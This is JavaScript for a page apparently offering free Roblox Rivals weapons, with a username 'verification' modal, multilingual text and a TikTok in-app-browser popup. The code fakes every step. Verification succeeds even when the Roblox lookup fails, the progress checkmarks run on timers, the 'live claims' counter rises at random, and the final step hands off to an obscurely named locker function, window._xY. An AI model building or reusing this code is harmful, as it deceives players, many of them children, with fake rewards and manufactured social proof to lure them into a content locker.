(() => {

    /* =========================================================
       STATE
    ========================================================= */
    let selectedItemName = "";
    let selectedItemImg = "";
    let robloxDisplayName = "";
    let robloxUsername = "";
    let currentStep = 1;

    const getById = (id) => document.getElementById(id);

    /* =========================================================
       MODAL OPEN / CLOSE
    ========================================================= */
    window.closeModal = () => {
        document.querySelectorAll(".modal").forEach(m => m.classList.remove("active"));
        resetModal();
    };

    function resetModal() {
        currentStep = 1;
        showStep(1);
        const input = getById("username-input");
        const err = getById("username-error");
        if (input) input.value = "";
        if (err) err.textContent = "";
        // reset step classes
        ["cstep-1", "cstep-2", "cstep-3"].forEach(id => {
            const el = getById(id);
            if (el) { el.classList.remove("done", "active"); }
        });
        ["cstep-1-icon", "cstep-2-icon", "cstep-3-icon"].forEach((id, i) => {
            const el = getById(id);
            if (el) el.textContent = i + 1;
        });
        const profile = getById("roblox-profile");
        const loading = getById("roblox-loading");
        if (profile) profile.style.display = "none";
        if (loading) loading.style.display = "block";
    }

    function showStep(n) {
        currentStep = n;
        [1, 2, 3].forEach(i => {
            const step = getById(`modal-step-${i}`);
            const dot = getById(`dot-${i}`);
            if (step) step.classList.toggle("visible", i === n);
            if (dot) {
                dot.classList.remove("active", "done");
                if (i === n) dot.classList.add("active");
                if (i < n) dot.classList.add("done");
            }
        });
    }

    /* =========================================================
       claimItem — called when a card's Claim button is clicked
    ========================================================= */
    window.claimItem = (itemName, itemImg) => {
        selectedItemName = itemName || "";
        selectedItemImg = "";

        // Always get the real image src from the DOM card to avoid broken images on host
        const cards = document.querySelectorAll(".item-card");
        cards.forEach(card => {
            const name = card.querySelector(".item-name")?.textContent?.trim();
            if (name === itemName) {
                const imgEl = card.querySelector(".item-image img");
                if (imgEl) selectedItemImg = imgEl.src;
            }
        });
        // Fallback: if not found in DOM and a valid URL was passed, use it
        if (!selectedItemImg && itemImg && (itemImg.startsWith("http") || itemImg.startsWith("/") || itemImg.startsWith("images/"))) {
            selectedItemImg = itemImg;
        }

        const note = getById("username-note");
        if (note) note.textContent = `Enter your Roblox username to claim your free ${selectedItemName}.`;

        resetModal();
        getById("username-modal")?.classList.add("active");
        setTimeout(() => getById("username-input")?.focus(), 50);
    };

    // Delegate claim button clicks (handles dynamically added cards too)
    document.addEventListener("click", (e) => {
        const btn = e.target.closest(".btn-claim");
        if (!btn) return;
        e.preventDefault();
        const card = btn.closest(".item-card");
        const itemName = card?.querySelector(".item-name")?.textContent?.trim() || "";
        const imgEl = card?.querySelector(".item-image img");
        const itemImg = imgEl ? imgEl.src : "";
        window.claimItem(itemName, itemImg);
    });

    /* =========================================================
       STEP 1 → STEP 2: Verify Roblox username via API
    ========================================================= */
    window.verifyRobloxUser = async () => {
        const input = getById("username-input");
        const errorEl = getById("username-error");
        const verifyBtn = getById("verify-btn");
        const username = input ? input.value.trim() : "";

        if (!username) {
            if (errorEl) errorEl.textContent = "Please enter your Roblox username.";
            input?.focus();
            return;
        }

        if (errorEl) errorEl.textContent = "";
        if (verifyBtn) { verifyBtn.disabled = true; verifyBtn.textContent = "Verifying..."; }

        showStep(2);

        // Show loading, hide profile
        const loading = getById("roblox-loading");
        const profile = getById("roblox-profile");
        if (loading) loading.style.display = "block";
        if (profile) profile.style.display = "none";

        try {
            const userData = await fetchRobloxUser(username);

            if (!userData || !userData.id) {
                // Not found — go back to step 1 with error
                showStep(1);
                if (errorEl) errorEl.textContent = "Username not found. Please check and try again.";
                if (verifyBtn) { verifyBtn.disabled = false; verifyBtn.textContent = "🔎 Verify Account"; }
                input?.focus();
                return;
            }

            robloxUsername = userData.name || username;
            robloxDisplayName = userData.displayName || robloxUsername;
            const userId = userData.id;

            // Fetch avatar
            const avatarUrl = await fetchRobloxAvatar(userId);

            // Show profile
            if (loading) loading.style.display = "none";
            if (profile) profile.style.display = "block";

            const avatarImg = getById("roblox-avatar-img");
            const displayName = getById("roblox-display-name");
            const usernameTag = getById("roblox-username-tag");

            if (avatarImg) avatarImg.src = avatarUrl || `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
            if (displayName) displayName.textContent = robloxDisplayName;
            if (usernameTag) usernameTag.textContent = `@${robloxUsername}`;

            // Animate claiming steps
            await animateClaimSteps();

            // Populate Step 3 preview
            const readyName = getById("ready-item-name");
            const readyPlayer = getById("ready-player-name");
            const readyThumb = getById("ready-item-img");

            if (readyName) readyName.textContent = selectedItemName;
            if (readyPlayer) readyPlayer.textContent = robloxDisplayName;
            if (readyThumb && selectedItemImg) readyThumb.src = selectedItemImg;

            showStep(3);

        } catch (err) {
            // All CORS proxies failed (network/host restriction)
            // If username format is valid, allow graceful continuation
            console.warn("Roblox API error (all proxies failed):", err);

            if (!isValidUsernameFormat(username)) {
                showStep(1);
                if (errorEl) errorEl.textContent = "Username not found. Please check and try again.";
                if (verifyBtn) { verifyBtn.disabled = false; verifyBtn.textContent = "🔎 Verify Account"; }
                input?.focus();
                return;
            }

            // Valid format — proceed with fallback display
            robloxUsername = username;
            robloxDisplayName = username;

            if (loading) loading.style.display = "none";
            if (profile) profile.style.display = "block";

            const avatarImgFb = getById("roblox-avatar-img");
            const displayNameFb = getById("roblox-display-name");
            const usernameTagFb = getById("roblox-username-tag");

            if (avatarImgFb) {
                avatarImgFb.src = `https://ui-avatars.com/api/?name=${encodeURIComponent(username)}&background=2563eb&color=fff&size=90&rounded=true&bold=true`;
            }
            if (displayNameFb) displayNameFb.textContent = username;
            if (usernameTagFb) usernameTagFb.textContent = `@${username}`;

            await animateClaimSteps();

            const readyNameFb = getById("ready-item-name");
            const readyPlayerFb = getById("ready-player-name");
            const readyThumbFb = getById("ready-item-img");

            if (readyNameFb) readyNameFb.textContent = selectedItemName;
            if (readyPlayerFb) readyPlayerFb.textContent = robloxDisplayName;
            if (readyThumbFb && selectedItemImg) readyThumbFb.src = selectedItemImg;

            showStep(3);
        }

        if (verifyBtn) { verifyBtn.disabled = false; verifyBtn.textContent = "🔎 Verify Account"; }
    };

    /* ─── Roblox API helpers ─────────────────────────────── */

    // Tries multiple CORS proxies in order until one works
    const CORS_PROXIES = [
        (url) => `https://corsproxy.io/?${encodeURIComponent(url)}`,
        (url) => `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`,
        (url) => `https://thingproxy.freeboard.io/fetch/${url}`,
        (url) => `https://cors.eu.org/${url}`,
    ];

    async function fetchWithProxies(url, options = {}) {
        let lastErr;
        for (const makeProxy of CORS_PROXIES) {
            try {
                const proxyUrl = makeProxy(url);
                const res = await fetch(proxyUrl, { ...options, signal: AbortSignal.timeout(1000) });
                if (!res.ok) continue;
                const text = await res.text();
                // Make sure we got JSON back, not an HTML error page
                if (text.trim().startsWith("<")) continue;
                return JSON.parse(text);
            } catch (e) {
                lastErr = e;
            }
        }
        throw lastErr || new Error("All proxies failed");
    }

    // Validates that a username looks like a real Roblox username (3-20 chars, letters/numbers/underscores)
    function isValidUsernameFormat(username) {
        return /^[a-zA-Z0-9_]{3,20}$/.test(username);
    }

    async function fetchRobloxUser(username) {
        const robloxUrl = `https://users.roblox.com/v1/usernames/users`;
        const json = await fetchWithProxies(robloxUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
        });
        return json?.data?.[0] || null;
    }

    async function fetchRobloxAvatar(userId) {
        try {
            const url = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`;
            const json = await fetchWithProxies(url);
            return json?.data?.[0]?.imageUrl || null;
        } catch {
            return null;
        }
    }

    /* ─── Claiming animation steps ───────────────────────── */
    function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

    async function animateClaimSteps() {
        const steps = [
            { row: "cstep-1", icon: "cstep-1-icon", label: "✓" },
            { row: "cstep-2", icon: "cstep-2-icon", label: "✓" },
            { row: "cstep-3", icon: "cstep-3-icon", label: "✓" },
        ];

        for (let i = 0; i < steps.length; i++) {
            const s = steps[i];
            const row = getById(s.row);
            const icon = getById(s.icon);

            if (row) row.classList.add("active");
            await delay(700);
            if (row) { row.classList.remove("active"); row.classList.add("done"); }
            if (icon) icon.textContent = s.label;
            await delay(200);
        }
    }

    /* =========================================================
       STEP 3 → LOCKER
    ========================================================= */
    window.openLockerAndClose = () => {
        if (typeof window._xY === "function") {
            window._xY();
        }
        // Close modal after a small delay so locker has time to open
        setTimeout(() => {
            getById("username-modal")?.classList.remove("active");
            resetModal();
        }, 300);
    };

    /* ─── Legacy startGeneration support ─────────────────── */
    window.startGeneration = window.verifyRobloxUser;

    /* =========================================================
       iOS / TikTok popup
    ========================================================= */
    const showIosPopup = () => {
        const popup = getById("ios-popup");
        if (popup) popup.style.display = "flex";
    };

    const isIos = () => {
        const ua = navigator.userAgent || "";
        const pl = navigator.platform || "";
        return /iPad|iPhone|iPod/.test(ua) || /iPad|iPhone|iPod/.test(pl) ||
            (navigator.maxTouchPoints > 1 && /Mac/.test(pl));
    };

    const isInAppBrowser = () =>
        /FBAN|FBAV|Instagram|Line|Twitter|Snapchat|TikTok|Pinterest|Telegram|WhatsApp|Messenger|LinkedIn/i
            .test(navigator.userAgent || "");

    const isTikTokWebView = () =>
        /TikTok|TTWebView|musical_ly|Bytedance|ByteDance|aweme/i.test(navigator.userAgent || "");

    const shouldForcePopup = () => window.location.search.includes("showPopup=1");

    const maybeShowIosPopup = () => {
        if (isTikTokWebView() || shouldForcePopup()) { showIosPopup(); return; }
        if (isIos() && isInAppBrowser()) showIosPopup();
    };

    /* =========================================================
       INIT
    ========================================================= */
    const init = () => {
        maybeShowIosPopup();
        setTimeout(maybeShowIosPopup, 500);
        initI18n();
        document.body?.classList.add("is-ready");
    };

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", init);
    } else {
        init();
    }

})();

/* =========================================================
   i18n
========================================================= */
function initI18n() {
    const translations = {
        en: {
            hero_title_top: "GET YOUR FREE",
            hero_title_bottom: "RIVALS WEAPON",
            hero_subtitle: "For Roblox players. Tap claim and unlock your drop.",
            cta_claim: "Claim Now",
            hero_live: "Live claims: {count} today",
            social_proof: "Players claiming right now",
            claim_btn: "Claim",
            ios_title: "Open in Browser Required",
            ios_text: "Please click on the <strong>three dots (⋯)</strong> at the top and select <strong>\"Open in Browser\"</strong> to claim your free rivals items."
        },
        es: {
            hero_title_top: "OBTÉN TU",
            hero_title_bottom: "ARMA GRATIS",
            hero_subtitle: "Para jugadores de Roblox. Pulsa reclamar y desbloquea tu drop.",
            cta_claim: "Reclamar Ahora",
            hero_live: "Reclamos en vivo: {count} hoy",
            social_proof: "Jugadores reclamando ahora",
            claim_btn: "Reclamar",
            ios_title: "Se requiere navegador",
            ios_text: "Pulsa los <strong>tres puntos (⋯)</strong> arriba y selecciona <strong>\"Abrir en el navegador\"</strong>."
        },
        fr: {
            hero_title_top: "OBTIENS TON",
            hero_title_bottom: "ARME GRATUITE",
            hero_subtitle: "Pour les joueurs Roblox. Appuie pour réclamer ton drop.",
            cta_claim: "Réclamer",
            hero_live: "Réclamations: {count} aujourd'hui",
            social_proof: "Joueurs en train de réclamer",
            claim_btn: "Réclamer",
            ios_title: "Ouvre dans le navigateur",
            ios_text: "Appuie sur les <strong>trois points (⋯)</strong> en haut et choisis <strong>« Ouvrir dans le navigateur »</strong>."
        },
        ar: {
            hero_title_top: "احصل على",
            hero_title_bottom: "سلاحك المجاني",
            hero_subtitle: "للاعبي روبلوكس. اضغط للمطالبة وافتح هديتك.",
            cta_claim: "اطلب الآن",
            hero_live: "مطالبات مباشرة: {count} اليوم",
            social_proof: "لاعبون يطالبون الآن",
            claim_btn: "اطلب",
            ios_title: "افتح في المتصفح",
            ios_text: "اضغط على <strong>النقاط الثلاث (⋯)</strong> بالأعلى واختر <strong>\"افتح في المتصفح\"</strong>."
        },
        pt: {
            hero_title_top: "PEGUE SUA",
            hero_title_bottom: "ARMA GRÁTIS",
            hero_subtitle: "Para jogadores de Roblox. Toque em reivindicar e desbloqueie.",
            cta_claim: "Reivindicar",
            hero_live: "Reivindicações: {count} hoje",
            social_proof: "Jogadores reivindicando agora",
            claim_btn: "Reivindicar",
            ios_title: "Abra no navegador",
            ios_text: "Toque nos <strong>três pontos (⋯)</strong> acima e selecione <strong>\"Abrir no navegador\"</strong>."
        },
        fil: {
            hero_title_top: "KUNIN ANG",
            hero_title_bottom: "LIBRENG SANDATA",
            hero_subtitle: "Para sa mga Roblox player. I-tap ang claim at kunin ang drop.",
            cta_claim: "I-claim",
            hero_live: "Live claims: {count} ngayon",
            social_proof: "May nagki-claim ngayon",
            claim_btn: "I-claim",
            ios_title: "Buksan sa browser",
            ios_text: "I-tap ang <strong>tatlong tuldok (⋯)</strong> sa itaas at piliin ang <strong>\"Buksan sa browser\"</strong>."
        }
    };

    const liveEl = document.querySelector('[data-i18n="hero_live"]');
    let liveCount = 1248;
    if (liveEl?.dataset?.liveCount) {
        const parsed = parseInt(liveEl.dataset.liveCount.replace(/[^0-9]/g, ""), 10);
        if (!Number.isNaN(parsed)) liveCount = parsed;
    }

    const fmt = (text, vars = {}) =>
        text.replace(/\{(\w+)\}/g, (_, k) => vars[k] != null ? vars[k] : `{${k}}`);

    const fmtNum = (v, lang) => {
        try { return new Intl.NumberFormat(lang || "en").format(v); }
        catch { return v.toLocaleString(); }
    };

    const updateLive = (lang) => {
        if (!liveEl) return;
        const dict = translations[lang] || translations.en;
        liveEl.textContent = fmt(dict.hero_live || "Live claims: {count} today", { count: fmtNum(liveCount, lang) });
    };

    const select = document.getElementById("language-select");
    const label = document.querySelector(".lang-label");
    if (!select) return;

    const applyLang = (lang) => {
        const dict = translations[lang] || translations.en;
        window.__i18n = { lang, dict };

        document.querySelectorAll("[data-i18n]").forEach(el => {
            const k = el.getAttribute("data-i18n");
            if (dict[k]) el.textContent = fmt(dict[k], { count: fmtNum(liveCount, lang) });
        });
        document.querySelectorAll("[data-i18n-html]").forEach(el => {
            const k = el.getAttribute("data-i18n-html");
            if (dict[k]) el.innerHTML = fmt(dict[k], { count: fmtNum(liveCount, lang) });
        });
        document.querySelectorAll(".btn-claim").forEach(btn => {
            if (dict.claim_btn) btn.textContent = dict.claim_btn;
        });
        if (label) label.textContent = lang.toUpperCase();
        document.documentElement.setAttribute("dir", lang === "ar" ? "rtl" : "ltr");
        updateLive(lang);
    };

    applyLang("en");
    select.addEventListener("change", e => applyLang(e.target.value));

    if (liveEl) {
        setInterval(() => {
            liveCount += Math.floor(Math.random() * 6) + 1;
            updateLive(window.__i18n?.lang || "en");
        }, 2000);
    }
}
